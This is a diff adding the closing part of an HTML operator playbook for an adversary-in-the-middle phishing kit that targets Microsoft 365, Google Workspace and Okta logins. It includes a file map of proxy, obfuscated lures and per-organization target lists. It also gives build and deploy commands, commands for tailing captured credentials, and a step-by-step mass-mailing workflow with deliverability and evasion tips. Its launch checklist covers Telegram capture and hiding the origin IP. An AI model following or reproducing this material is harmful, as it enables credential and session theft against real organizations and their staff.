+    <tr><td>Emails landing in spam</td><td>Run through mail-tester.com &mdash; score below 9 means fix SPF/DKIM/DMARC</td></tr>
+    <tr><td>SuperMailer SMTP auth fails</td><td>Verify port 587/TLS, check credentials, ensure IP not blocked by relay</td></tr>
+    <tr><td>Bounce rate &gt;5% during campaign</td><td>Pause immediately &mdash; investigate invalid addresses or sender reputation</td></tr>
+    <tr><td>High opens, zero captures</td><td>Bootloader or proxy may be down &mdash; verify with <code>curl -I https://&lt;domain&gt;/</code></td></tr>
+  </tbody>
+</table>
+
+<h2>File Map</h2>
+
+<pre><code>azure-phish-kit/
+&#x251C;&#x2500;&#x2500; proxy-server/
+&#x2502;   &#x251C;&#x2500;&#x2500; main.go              # AiTM reverse proxy (the core)
+&#x2502;   &#x251C;&#x2500;&#x2500; bootloader.html       # Embedded JS decryptor
+&#x2502;   &#x251C;&#x2500;&#x2500; phishlet.go           # Phishlet loader + matcher
+&#x2502;   &#x251C;&#x2500;&#x2500; ratelimit.go          # Token-bucket rate limiter
+&#x2502;   &#x2514;&#x2500;&#x2500; phishlets/
+&#x2502;       &#x251C;&#x2500;&#x2500; microsoft.json    # Microsoft 365 phishlet
+&#x2502;       &#x251C;&#x2500;&#x2500; google.json       # Google Workspace phishlet
+&#x2502;       &#x2514;&#x2500;&#x2500; okta.json         # Okta SSO phishlet
+&#x251C;&#x2500;&#x2500; payload-generator/
+&#x2502;   &#x251C;&#x2500;&#x2500; main.go               # AES-256-GCM payload encryptor
+&#x2502;   &#x2514;&#x2500;&#x2500; keygen.go             # Key generator
+&#x251C;&#x2500;&#x2500; analytics-server/
+&#x2502;   &#x251C;&#x2500;&#x2500; main.go               # Dashboard HTTP server
+&#x2502;   &#x251C;&#x2500;&#x2500; analytics.go          # JSONL parser + aggregator
+&#x2502;   &#x2514;&#x2500;&#x2500; dashboard.html        # Server-rendered template
+&#x251C;&#x2500;&#x2500; cdn-config/
+&#x2502;   &#x251C;&#x2500;&#x2500; worker.js             # Cloudflare Worker
+&#x2502;   &#x2514;&#x2500;&#x2500; wrangler.toml         # Worker deployment config
+&#x251C;&#x2500;&#x2500; campaign-emails/
+&#x2502;   &#x251C;&#x2500;&#x2500; email/                # Inline HTML email lures (paste into SuperMailer HTML Source)
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; shared-document.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; contract-signature.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; expense-report.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; hr-document.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; invoice-payment.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; it-support.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; meeting-invite.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; package-delivery.html
+&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; security-alert.html
+&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; voicemail-notification.html
+&#x2502;   &#x2514;&#x2500;&#x2500; attachments/          # HTML attachment lures (attach to email in SuperMailer)
+&#x2502;       &#x251C;&#x2500;&#x2500; adobe-contract.html
+&#x2502;       &#x251C;&#x2500;&#x2500; docusign-wire.html
+&#x2502;       &#x251C;&#x2500;&#x2500; dropbox-share.html
+&#x2502;       &#x251C;&#x2500;&#x2500; excel-shared.html
+&#x2502;       &#x251C;&#x2500;&#x2500; gdocs-shared.html
+&#x2502;       &#x251C;&#x2500;&#x2500; onedrive-file.html
+&#x2502;       &#x251C;&#x2500;&#x2500; sharepoint-doc.html
+&#x2502;       &#x251C;&#x2500;&#x2500; stripe-payment.html
+&#x2502;       &#x251C;&#x2500;&#x2500; teams-recording.html
+&#x2502;       &#x2514;&#x2500;&#x2500; zoom-recording.html
+&#x251C;&#x2500;&#x2500; campaign-emails-obfuscated/  # Obfuscated copies of email lures (production-ready)
+&#x2502;   &#x251C;&#x2500;&#x2500; email/
+&#x2502;   &#x2514;&#x2500;&#x2500; attachments/
+&#x251C;&#x2500;&#x2500; scripts/
+&#x2502;   &#x2514;&#x2500;&#x2500; generate-url.sh       # URL assembly helper
+&#x251C;&#x2500;&#x2500; data/
+&#x2502;   &#x251C;&#x2500;&#x2500; captures.jsonl        # Event log (gitignored)
+&#x2502;   &#x2514;&#x2500;&#x2500; leads/                # Target lead CSVs for SuperMailer import
+&#x2502;       &#x251C;&#x2500;&#x2500; addus_com.csv
+&#x2502;       &#x2514;&#x2500;&#x2500; ...               # (one CSV per target organization)
+&#x251C;&#x2500;&#x2500; CURRENT_LINK.txt           # Active phishing URL (single source of truth)
+&#x2514;&#x2500;&#x2500; docs/
+    &#x251C;&#x2500;&#x2500; architecture.md
+    &#x251C;&#x2500;&#x2500; proxy-architecture.md
+    &#x251C;&#x2500;&#x2500; threat-intel-report.md
+    &#x2514;&#x2500;&#x2500; playbook/
+        &#x2514;&#x2500;&#x2500; glnt-phish-kit-playbook.md</code></pre>
+
+<h2>Quick Reference</h2>
+
+<h3>Payload &amp; URL</h3>
+
+<pre><code># Generate key
+cd payload-generator &amp;&amp; go run keygen.go
+
+# Generate URL
+go run . --key &lt;KEY&gt; --email &lt;EMAIL&gt; --redirect &lt;OAUTH_URL&gt; --campaign &lt;ID&gt;
+
+# View current active link
+cat CURRENT_LINK.txt</code></pre>
+
+<h3>Build &amp; Deploy</h3>
+
+<pre><code># Build proxy (Linux)
+cd proxy-server &amp;&amp; GOOS=linux GOARCH=amd64 go build -o proxy-srv .
+
+# Deploy to EC2
+scp proxy-srv ubuntu@&lt;EC2-IP&gt;:/home/ubuntu/azure-phish-kit/proxy-server/
+ssh ubuntu@&lt;EC2-IP&gt; "sudo systemctl restart phish-proxy"
+
+# Deploy Worker
+cd cdn-config &amp;&amp; npx wrangler deploy
+
+# View captures
+ssh ubuntu@&lt;EC2-IP&gt; "tail -f /home/ubuntu/azure-phish-kit/data/captures.jsonl"
+
+# Analytics
+open http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;</code></pre>
+
+<h3>SuperMailer Workflow</h3>
+
+<pre><code># 1. Grab the latest lure link
+cat CURRENT_LINK.txt
+# &rarr; https://glnt.cc/#&lt;encrypted-fragment&gt;
+
+# 2. Build the lure with the link embedded
+# (link is already embedded in campaign-emails/email/*.html files
+#  &mdash; just regenerate if you need a fresh link per campaign)
+
+# 3. In SuperMailer:
+#    Settings &rarr; SMTP Server &rarr; Port 587, STARTTLS, set throttle 50/hr
+#    Recipients &rarr; Import CSV &rarr; data/leads/&lt;target&gt;.csv
+#      Map: email&rarr;Email, first&rarr;FirstName, last&rarr;LastName
+#    Campaign &rarr; Message &rarr; HTML Source &rarr; paste campaign-emails/email/&lt;lure&gt;.html
+#    Sender: From Name matches lure brand, From Email = sender domain
+#    Send Test to yourself &rarr; verify at mail-tester.com (score 9+)
+#    Send Campaign &rarr; monitor bounce rate &lt;5%, cross-ref analytics dashboard
+
+# 4. For attachment lures:
+#    Campaign &rarr; Message &rarr; write short body text
+#    Attach: campaign-emails/attachments/&lt;brand&gt;.html
+#    Sender must match the attachment brand
+#    Test by opening the attachment yourself before sending</code></pre>
+
+<h3>Campaign Checklist</h3>
+
+<div class="warn"><strong>Complete before every campaign launch:</strong></div>
+
+<table>
+  <tbody>
+    <tr><td>&#x2610; Fresh link generated and saved to <code>CURRENT_LINK.txt</code></td></tr>
+    <tr><td>&#x2610; Link embedded in lure HTML (paste into SuperMailer HTML Source)</td></tr>
+    <tr><td>&#x2610; SMTP configured: Port 587, STARTTLS, throttle 50-100/hr</td></tr>
+    <tr><td>&#x2610; Leads imported from <code>data/leads/</code> with correct column mapping</td></tr>
+    <tr><td>&#x2610; Sender domain has valid SPF, DKIM, DMARC</td></tr>
+    <tr><td>&#x2610; Sender identity matches lure branding</td></tr>
+    <tr><td>&#x2610; Test email sent to yourself &mdash; renders correctly in Gmail, Outlook, mobile</td></tr>
+    <tr><td>&#x2610; mail-tester.com score 9+/10</td></tr>
+    <tr><td>&#x2610; Link clickable from received email &mdash; reaches real login page</td></tr>
+    <tr><td>&#x2610; Telegram capture confirmed from test</td></tr>
+    <tr><td>&#x2610; Headers checked &mdash; no phishing domain or origin IP leaks</td></tr>
+    <tr><td>&#x2610; Warm-up schedule planned (10/hr &rarr; 50/hr over 3 days)</td></tr>
+    <tr><td>&#x2610; Analytics dashboard open for monitoring</td></tr>
+  </tbody>
+</table>
+
+<p style="text-align:center; margin-top:48px; color:var(--ink-faint); font-family: 'JetBrains Mono', 'Menlo', 'Consolas', monospace; font-size: 0.7rem; letter-spacing: 0.08em;">End of Playbook</p>
+
+<div class="footer">
+  <span>FM-001 &middot; STRASSER &#x271B; LAB</span>
+  <span>June 2026</span>
+</div>
+
+</div>
 </body>
 </html>
